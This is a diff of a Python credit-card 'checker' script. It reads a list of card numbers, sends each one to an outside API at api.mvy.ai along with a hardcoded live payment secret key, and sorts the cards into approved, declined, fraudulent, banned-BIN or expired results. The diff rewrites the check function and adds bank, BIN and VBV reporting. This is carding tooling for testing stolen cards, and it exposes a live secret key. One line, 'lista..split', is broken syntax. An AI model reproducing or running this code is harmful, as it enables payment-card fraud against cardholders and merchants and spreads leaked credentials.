@@ -62,59 +62,62 @@ def read_cc_file(file_path):
     return cc_list
 
 # Function to make a single API request and process the response
-def check_cc(cc, amount, currency, retry_count=0):
-    if retry_count > MAX_RETRIES:
-        print(f"{cc} Max retries exceeded.")
-        return
+API_URL = "https://api.mvy.ai/"
 
-    url = "https://api.mvy.ai/"
+def check_cc(lista, amount=5.0, currency="usd"):
+    if not lista:
+        raise ValueError("Card information (lista) is required.")
+
+    cc = ':'.join(lista..split('|'))
     params = {
         "lista": cc,
-        "sk": "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",
-        "amount": amount,
         "currency": currency,
+        "amount": amount,
+        "sk": "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"
     }
 
+
     try:
-        start_time = time.time()
-        response = requests.get(url, params=params)
-        end_time = time.time()
-        total_time = end_time - start_time
+        response = requests.get(API_URL, params=params)
+        response_data = response.json()
 
-        # Check if response is empty or not in JSON format
-        if not response.text:
-            result = f"{cc} Empty response ❌ Time Taken: {total_time:.2f} seconds"
+        if response.status_code != 200:
+            raise requests.exceptions.HTTPError(f"HTTP Error: {response.status_code}")
+
+        status = response_data.get('status')
+        message = response_data.get('message')
+
+        if status == "approved":
+            html_message = response_data.get('html_message', "")
+            card_info = response_data.get('card_info', {})
+            payment_info = response_data.get('payment_info', {})
+            bank_info = response_data.get('bank_info', {})
+            rate_limit = response_data.get('rate_limit', {})
+
+            # Example of processing response data
+            result = f"Transaction Approved ✅\n"
+            result += f"Card: {card_info.get('number', '')}\n"
+            result += f"Response: {message}\n"
+            result += f"Amount: {payment_info.get('amount', '')} {payment_info.get('currency', '')}\n"
+            result += f"Bin Info: {bank_info.get('bin_info', '')}\n"
+            result += f"Bank: {bank_info.get('issuing_bank', '')}\n"
+            result += f"Country: {bank_info.get('country', '')}\n"
+            result += f"Time Taken: {rate_limit.get('time_taken', '')}\n"
+            result += f"Vbv: {bank_info.get('vbv', '')}\n"
+            result += f"Gateway: {html_message.splitlines()[7].strip()}"
+
         else:
-            response_data = response.json()
-            status = response_data.get('status', '')
-            message = response_data.get('message', '')
-            amount = response_data.get('payment_info', {}).get('amount', '')
-            currency = response_data.get('payment_info', {}).get('currency', '')
-            risk = response_data.get('payment_info', {}).get('risk_level', '')
-            receipt_url = response_data.get('payment_info', {}).get('receipt_url', '')
-            api_time = response_data.get('rate_limit', {}).get('time_taken', '')
-
-            if 'fraudulent' in message:
-                result = f"{cc} Fraudulent ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
-            elif 'generic_decline' in message:
-                result = f"{cc} GENERIC DECLINED ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
-            elif 'ERR013' in message:
-                result = f"{cc} THE FUCKING BIN IS BANNED ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
-            elif 'ERR012' in message:
-                result = f"{cc} THE CARD IS FUCKING EXPIRED BRUH ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
-            else:
-                result = f"{cc} {message} ✅ Time Taken: {api_time} {risk} {amount} {currency} {receipt_url}"
-                save_live_response(cc, message)
+            result = f"Transaction Failed ❌\nMessage: {message}"
 
     except requests.exceptions.RequestException as e:
-        print(f"{cc} Request Exception: {str(e)}. Retrying ({retry_count + 1}/{MAX_RETRIES + 1})...")
-        time.sleep(1)  # Wait for 1 second before retrying
-        check_cc(cc, amount, currency, retry_count + 1)
-
+        result = f"Request Exception: {str(e)}"
+    
     except json.JSONDecodeError as e:
-        print(f"{cc} JSON Decode Error: {str(e)}")
+        result = f"JSON Decode Error: {str(e)}"
+    
+    except Exception as e:
+        result = f"Error: {str(e)}"
 
-    print(result)
     return result
 
 # Save the response to Live.txt if the message is not fraudulent or generic_decline
